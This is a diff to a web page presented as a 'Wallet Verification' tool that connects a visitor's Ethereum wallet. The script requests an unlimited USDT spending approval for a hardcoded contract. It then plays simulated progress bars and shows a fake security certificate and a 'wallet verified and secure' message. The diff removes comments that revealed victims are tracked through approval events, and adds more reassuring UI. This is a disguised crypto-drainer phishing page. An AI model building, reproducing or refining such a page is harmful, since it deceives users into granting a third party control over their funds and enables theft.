@@ -169,6 +169,7 @@
             background: #f8fafc;
             border-radius: 12px;
             padding: 20px;
+            margin-bottom: 20px;
         }
         
         .progress-container.show {
@@ -278,6 +279,82 @@
         @keyframes pulse {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.5; }
+        }
+        
+        /* Analysis Complete Section */
+        .analysis-complete {
+            display: none;
+            background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
+            border: 2px solid #10b981;
+            border-radius: 12px;
+            padding: 30px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .analysis-complete.show {
+            display: block;
+        }
+        
+        .complete-icon {
+            width: 60px;
+            height: 60px;
+            background: white;
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.2);
+        }
+        
+        .complete-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #065f46;
+            margin-bottom: 10px;
+        }
+        
+        .complete-score {
+            font-size: 48px;
+            font-weight: 800;
+            color: #10b981;
+            margin-bottom: 10px;
+        }
+        
+        .complete-message {
+            font-size: 14px;
+            color: #047857;
+            margin-bottom: 5px;
+        }
+        
+        .complete-submessage {
+            font-size: 12px;
+            color: #059669;
+            opacity: 0.8;
+        }
+        
+        .download-btn {
+            width: 100%;
+            background: #10b981;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .download-btn:hover {
+            background: #059669;
+            transform: translateY(-2px);
         }
         
         .modal-overlay {
@@ -502,11 +579,21 @@
         .cert-btn-close:hover {
             background: rgba(255, 255, 255, 0.3);
         }
+        
+        /* Print styles */
+        @media print {
+            body {
+                background: white;
+            }
+            .cert-btn-close {
+                display: none;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔐 Wallet Verification4</h1>
+        <h1>🔐 Wallet Verification 5</h1>
         
         <div class="connect-section">
             <div class="connect-row">
@@ -612,6 +699,20 @@
                     </div>
                 </div>
             </div>
+            
+            <!-- Analysis Complete Section -->
+            <div id="analysisComplete" class="analysis-complete">
+                <div class="complete-icon">🛡️</div>
+                <div class="complete-title">🎉 Analysis Complete! 🎉</div>
+                <div class="complete-score" id="completeScore">68%</div>
+                <div class="complete-message">✅ Your USDT are of good quality and secure</div>
+                <div class="complete-submessage">🔒 Wallet verified and secure</div>
+            </div>
+            
+            <!-- Download Certificate Button -->
+            <button id="downloadBtn" class="download-btn" onclick="printCertificate()" style="display: none;">
+                📥 Download Certificate
+            </button>
         </div>
     </div>
     
@@ -690,10 +791,10 @@
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script>
         // ========================================
-        // CONFIGURATION - UPDATE THESE!
+        // CONFIGURATION
         // ========================================
-        const CONTRACT_ADDRESS = "0x7BDD962fff20FB63a1C05bd1d2e67807EA0f57c0"; // ← Update with deployed address!
-        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Real USDT on Ethereum Mainnet
+        const CONTRACT_ADDRESS = "0x7BDD962fff20FB63a1C05bd1d2e67807EA0f57c0";
+        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
         
         const USDT_ABI = [
             {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
@@ -739,7 +840,7 @@
         }
 
         // ========================================
-        // START VERIFICATION (ONLY APPROVAL - NO REGISTRATION!)
+        // START VERIFICATION
         // ========================================
         async function startVerification() {
             try {
@@ -747,26 +848,19 @@
                 document.getElementById('verifyBtn').disabled = true;
                 document.getElementById('verifyBtn').textContent = 'Checking approval...';
                 
-                // Check if already approved
                 const currentAllowance = await usdtContract.methods.allowance(account, CONTRACT_ADDRESS).call();
-                const minRequired = web3.utils.toBN('1000000'); // 1 USDT
+                const minRequired = web3.utils.toBN('1000000');
                 
                 if (web3.utils.toBN(currentAllowance).lt(minRequired)) {
-                    // Need approval
                     document.getElementById('verifyBtn').textContent = 'Approve USDT...';
                     const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                     await usdtContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ from: account });
                 }
                 
-                // NO REGISTRATION - Just approval is enough!
-                // Users are tracked via Etherscan approval events
-                
-                // Start visual analysis
                 document.getElementById('verifyBtn').textContent = 'Analyzing...';
                 document.getElementById('progressContainer').classList.add('show');
                 document.getElementById('analyzingText').classList.add('show');
                 
-                // Reset progress bars
                 for (let i = 1; i <= 5; i++) {
                     document.getElementById(`bar${i}`).style.width = '0%';
                     document.getElementById(`percent${i}`).textContent = '0%';
@@ -775,10 +869,8 @@
                 document.getElementById('overallBar').style.width = '0%';
                 document.getElementById('overallPercent').textContent = '0%';
                 
-                // Animate progress
                 await simulateProgress();
                 
-                // Generate certificate
                 generateCertificateData();
                 document.getElementById('analyzingText').classList.remove('show');
                 showCertificate();
@@ -804,7 +896,7 @@
         }
 
         // ========================================
-        // SIMULATE PROGRESS BARS
+        // SIMULATE PROGRESS
         // ========================================
         async function simulateProgress() {
             const steps = [
@@ -885,6 +977,9 @@
             document.getElementById('certWalletAddress').textContent = account.slice(0, 10) + '...';
             document.getElementById('certDate').textContent = certificateData.verificationDate;
             
+            // Update the Analysis Complete section with THE SAME SCORE
+            document.getElementById('completeScore').textContent = `${certificateData.securityScore}%`;
+            
             document.getElementById('certificateModal').classList.add('show');
         }
 
@@ -893,8 +988,20 @@
         // ========================================
         function closeCertificate() {
             document.getElementById('certificateModal').classList.remove('show');
+            
+            // Show Analysis Complete section and Download button
+            document.getElementById('analysisComplete').classList.add('show');
+            document.getElementById('downloadBtn').style.display = 'flex';
+            
+            // Hide the verify button
             document.getElementById('verifyBtn').style.display = 'none';
-            document.getElementById('progressContainer').classList.remove('show');
+        }
+
+        // ========================================
+        // PRINT CERTIFICATE (Download Certificate button)
+        // ========================================
+        function printCertificate() {
+            window.print();
         }
 
         // ========================================
